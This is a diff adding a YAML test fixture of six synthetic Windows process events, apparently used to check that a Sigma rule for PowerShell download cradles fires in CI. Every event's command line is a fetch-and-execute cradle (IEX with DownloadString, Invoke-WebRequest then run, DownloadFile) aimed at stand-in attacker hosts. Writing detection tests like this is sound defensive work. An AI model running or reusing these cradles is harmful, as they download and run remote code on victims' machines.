@@ -1,0 +1,51 @@
+# Atomic test fixture for T1059.001 - PowerShell download cradles.
+# Each event is a synthetic process_creation record formatted in ECS fields.
+# The matched_rule key names the Sigma rule this event is expected to trigger.
+attack_technique: T1059.001
+matched_rule: suspicious_powershell_download
+description: >
+  Six variants of in-memory PowerShell download cradles. Every event here MUST
+  cause the rule suspicious_powershell_download.yml to match. If any event
+  fails to match, the rule has a coverage gap and CI blocks the PR.
+events:
+  - name: classic_webclient_downloadstring
+    process.name: powershell.exe
+    process.command_line: "powershell.exe -NoProfile -Command IEX ((New-Object Net.WebClient).DownloadString('https://malicious.example/payload.ps1'))"
+    process.parent.name: explorer.exe
+    user.name: alice
+    host.name: WIN-LAB-01
+
+  - name: downloadfile_to_disk_then_execute
+    process.name: powershell.exe
+    process.command_line: "powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('https://attacker.example/x.exe','C:\\Users\\Public\\x.exe')"
+    process.parent.name: outlook.exe
+    user.name: bob
+    host.name: WIN-LAB-02
+
+  - name: invoke_webrequest_cradle
+    process.name: powershell.exe
+    process.command_line: "powershell -ep bypass -c Invoke-WebRequest -Uri https://attacker.example/stage2 -OutFile $env:TEMP\\s.ps1; & $env:TEMP\\s.ps1"
+    process.parent.name: winword.exe
+    user.name: carol
+    host.name: WIN-LAB-03
+
+  - name: iex_short_form
+    process.name: powershell.exe
+    process.command_line: "powershell -c \"IEX (iwr 'https://attacker.example/a.ps1')\""
+    process.parent.name: cmd.exe
+    user.name: dave
+    host.name: WIN-LAB-04
+
+  - name: pwsh_core_variant
+    process.name: pwsh.exe
+    process.command_line: "pwsh -NoProfile -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('https://attacker.example/p.ps1')"
+    process.parent.name: explorer.exe
+    user.name: eve
+    host.name: WIN-LAB-05
+
+  - name: downloadstring_through_variable
+    process.name: powershell.exe
+    process.command_line: "powershell -c $u='https://attacker.example/x'; IEX (New-Object Net.WebClient).DownloadString($u)"
+    process.parent.name: wscript.exe
+    user.name: frank
+    host.name: WIN-LAB-06
